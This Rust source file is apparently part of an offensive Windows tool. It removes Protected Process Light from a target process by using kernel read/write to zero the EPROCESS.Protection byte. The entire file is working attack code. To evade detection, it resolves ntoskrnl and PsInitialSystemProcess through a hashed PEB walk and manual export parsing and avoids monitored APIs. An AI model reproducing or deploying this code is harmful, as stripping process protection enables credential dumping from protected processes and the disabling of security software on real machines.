//! PPL (Protected Process Light) bypass via EPROCESS.Protection manipulation
//!
//! Uses kernel R/W to zero the EPROCESS.Protection field.
//! ntoskrnl base found via NtQuerySystemInformation (no EnumDeviceDrivers).
//! PsInitialSystemProcess offset found via PEB walk + EAT parse (no GetProcAddress).

use crate::kernel_rw::KernelRW;
use crate::offsets::EprocessOffsets;
use crate::resolver;
use windows::Win32::Foundation::*;

/// Saved PPL state for restoration
pub struct PplState {
    pub eprocess_addr: u64,
    pub protection_addr: u64,
    pub original_protection: u8,
}

/// Bypass PPL protection on a target process
pub fn bypass_ppl(
    krw: &KernelRW,
    offsets: &EprocessOffsets,
    target_pid: u32,
) -> Result<PplState, String> {
    // Step 1: Get ntoskrnl base via NtQuerySystemInformation(SystemModuleInformation)
    let ntos_base = get_ntoskrnl_base_ntapi()?;
    println!("    ntoskrnl.exe base: 0x{:016X}", ntos_base);

    // Step 2: Resolve PsInitialSystemProcess offset via PE export parse
    let ps_initial_offset = get_ps_initial_offset_peb()?;
    println!("    PsInitialSystemProcess RVA: 0x{:X}", ps_initial_offset);

    let ps_initial_addr = ntos_base + ps_initial_offset;

    // Step 3: Read PsInitialSystemProcess → System EPROCESS pointer
    let system_eprocess = krw
        .read_u64(ps_initial_addr)
        .map_err(|e| format!("Failed to read PsInitialSystemProcess: {}", e))?;
    println!("    System EPROCESS: 0x{:016X}", system_eprocess);

    if system_eprocess == 0 || system_eprocess < 0xFFFF000000000000 {
        return Err(format!(
            "Invalid System EPROCESS: 0x{:016X}",
            system_eprocess
        ));
    }

    // Step 4: Walk ActiveProcessLinks → find target
    let target_eprocess = walk_process_list(krw, offsets, system_eprocess, target_pid)?;
    println!(
        "    Target EPROCESS (PID {}): 0x{:016X}",
        target_pid, target_eprocess
    );

    // Verify process name
    let mut name_buf = [0u8; 15];
    krw.read_bytes(target_eprocess + offsets.image_file_name, &mut name_buf)?;
    let name = String::from_utf8_lossy(&name_buf)
        .trim_end_matches('\0')
        .to_string();
    println!("    Verified: {}", name);

    // Step 5: Read + zero Protection
    let protection_addr = target_eprocess + offsets.protection;
    let original_protection = krw.read_u8(protection_addr)?;
    println!("    Current Protection: 0x{:02X}", original_protection);

    krw.write_u8(protection_addr, 0x00)?;
    let verify = krw.read_u8(protection_addr)?;
    if verify != 0x00 {
        return Err(format!("Protection verify failed: 0x{:02X}", verify));
    }

    Ok(PplState {
        eprocess_addr: target_eprocess,
        protection_addr,
        original_protection,
    })
}

/// Restore PPL protection
pub fn restore_ppl(
    krw: &KernelRW,
    _offsets: &EprocessOffsets,
    state: &PplState,
) -> Result<(), String> {
    krw.write_u8(state.protection_addr, state.original_protection)?;
    let verify = krw.read_u8(state.protection_addr)?;
    if verify != state.original_protection {
        return Err(format!("Restore verify failed: 0x{:02X}", verify));
    }
    Ok(())
}

/// Get ntoskrnl base via NtQuerySystemInformation(SystemModuleInformation = 11)
fn get_ntoskrnl_base_ntapi() -> Result<u64, String> {
    // SystemModuleInformation (11) returns RTL_PROCESS_MODULES
    // First entry is always ntoskrnl.exe
    const SYSTEM_MODULE_INFORMATION: u32 = 11;

    #[repr(C)]
    struct RtlProcessModuleInfo {
        section: usize,
        mapped_base: usize,
        image_base: usize,
        image_size: u32,
        flags: u32,
        load_order_index: u16,
        init_order_index: u16,
        load_count: u16,
        offset_to_file_name: u16,
        full_path_name: [u8; 256],
    }

    // NtQuerySystemInformation via raw FFI
    type FnNtQuerySystemInformation = unsafe extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32;

    unsafe {
        let peb = get_peb();
        let ldr = (*(peb as *const Peb64)).ldr;
        let list_head = &(*ldr).in_memory_order_module_list as *const ListEntry;
        let mut current = (*list_head).flink;

        // Find ntdll
        let mut ntdll_base: *mut u8 = std::ptr::null_mut();
        while current != list_head as *mut _ {
            let entry =
                (current as *const u8).sub(std::mem::size_of::<ListEntry>()) as *const LdrEntry;
            let name = &(*entry).base_dll_name;
            if name.length > 0 && !name.buffer.is_null() {
                let name_slice =
                    std::slice::from_raw_parts(name.buffer, (name.length / 2) as usize);
                let hash = resolver::djb2_hash_wide(name_slice);
                if hash == resolver::HASH_NTDLL {
                    ntdll_base = (*entry).dll_base;
                    break;
                }
            }
            current = (*current).flink;
        }

        if ntdll_base.is_null() {
            return Err("ntdll not found".into());
        }

        // Resolve NtQuerySystemInformation from ntdll
        let nqsi_hash = resolver::djb2_hash(b"NtQuerySystemInformation");
        let tmp_resolver = resolver::ApiResolver {
            kernel32_base: std::ptr::null_mut(),
            ntdll_base,
            advapi32_base: std::ptr::null_mut(),
        };
        let nqsi_ptr = tmp_resolver
            .ntdll(nqsi_hash)
            .ok_or("NtQuerySystemInformation not found")?;
        let nqsi: FnNtQuerySystemInformation = std::mem::transmute(nqsi_ptr);

        let mut buf_size = 1024 * 64u32;
        let mut buffer: Vec<u8> = vec![0; buf_size as usize];
        let mut ret_len = 0u32;

        let status = nqsi(
            SYSTEM_MODULE_INFORMATION,
            buffer.as_mut_ptr(),
            buf_size,
            &mut ret_len,
        );
        if status != 0 {
            buf_size = ret_len + 4096;
            buffer.resize(buf_size as usize, 0);
            let status = nqsi(
                SYSTEM_MODULE_INFORMATION,
                buffer.as_mut_ptr(),
                buf_size,
                &mut ret_len,
            );
            if status != 0 {
                return Err(format!("NtQuerySystemInformation failed: 0x{:08X}", status));
            }
        }

        // First 8 bytes = number of modules (on x64, it's a usize)
        let num_modules = *(buffer.as_ptr() as *const usize);
        if num_modules == 0 {
            return Err("No kernel modules found".into());
        }

        // First module entry starts at offset sizeof(usize)
        let first_module =
            buffer.as_ptr().add(std::mem::size_of::<usize>()) as *const RtlProcessModuleInfo;
        Ok((*first_module).image_base as u64)
    }
}

/// Get PsInitialSystemProcess RVA by parsing ntoskrnl PE exports
fn get_ps_initial_offset_peb() -> Result<u64, String> {
    // Load ntoskrnl.exe as data-only, then parse its EAT
    // We use LoadLibraryExW with DONT_RESOLVE_DLL_REFERENCES
    use windows::Win32::System::LibraryLoader::*;

    unsafe {
        // Construct "ntoskrnl.exe" on stack
        let ntos: Vec<u16> = [
            'n' as u16, 't' as u16, 'o' as u16, 's' as u16, 'k' as u16, 'r' as u16, 'n' as u16,
            'l' as u16, '.' as u16, 'e' as u16, 'x' as u16, 'e' as u16, 0u16,
        ]
        .to_vec();

        let user_ntos = LoadLibraryExW(
            windows::core::PCWSTR(ntos.as_ptr()),
            None,
            DONT_RESOLVE_DLL_REFERENCES,
        )
        .map_err(|e| format!("LoadLibraryExW failed: {}", e))?;

        let base = user_ntos.0 as *mut u8;
        let target_hash = resolver::djb2_hash(b"PsInitialSystemProcess");

        // Parse EAT manually
        let addr = resolver::ApiResolver {
            kernel32_base: std::ptr::null_mut(),
            ntdll_base: std::ptr::null_mut(),
            advapi32_base: std::ptr::null_mut(),
        }
        .resolve(base, target_hash);

        let _ = FreeLibrary(user_ntos);

        match addr {
            Some(a) => Ok(a as u64 - base as u64),
            None => Err("PsInitialSystemProcess not found in ntoskrnl exports".into()),
        }
    }
}

// Mini PEB structs for this module (avoids circular dependency)
#[repr(C)]
struct Peb64 {
    r1: [u8; 2],
    r2: u8,
    r3: u8,
    r4: [*mut u8; 2],
    ldr: *mut PebLdr,
}
#[repr(C)]
struct PebLdr {
    r1: [u8; 8],
    r2: [*mut u8; 3],
    in_memory_order_module_list: ListEntry,
}
#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}
#[repr(C)]
struct LdrEntry {
    in_load: ListEntry,
    in_memory: ListEntry,
    in_init: ListEntry,
    dll_base: *mut u8,
    entry_point: *mut u8,
    size_of_image: u32,
    full_dll_name: UStr,
    base_dll_name: UStr,
}
#[repr(C)]
struct UStr {
    length: u16,
    max_length: u16,
    buffer: *mut u16,
}

unsafe fn get_peb() -> *mut u8 {
    let peb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    peb
}

/// Walk EPROCESS linked list to find process by PID
fn walk_process_list(
    krw: &KernelRW,
    offsets: &EprocessOffsets,
    system_eprocess: u64,
    target_pid: u32,
) -> Result<u64, String> {
    let list_head = system_eprocess + offsets.active_process_links;
    let mut current_link = krw.read_u64(list_head)?;
    let mut iterations = 0u32;

    loop {
        if iterations > 4096 {
            return Err("Process walk exceeded limit".into());
        }
        iterations += 1;

        let eprocess = current_link - offsets.active_process_links;
        if eprocess < 0xFFFF000000000000 {
            current_link = krw.read_u64(current_link)?;
            if current_link == list_head {
                break;
            }
            continue;
        }

        let pid = krw.read_u64(eprocess + offsets.unique_process_id)?;
        if pid as u32 == target_pid {
            return Ok(eprocess);
        }

        current_link = krw.read_u64(current_link)?;
        if current_link == list_head {
            break;
        }
    }

    Err(format!("PID {} not found", target_pid))
}
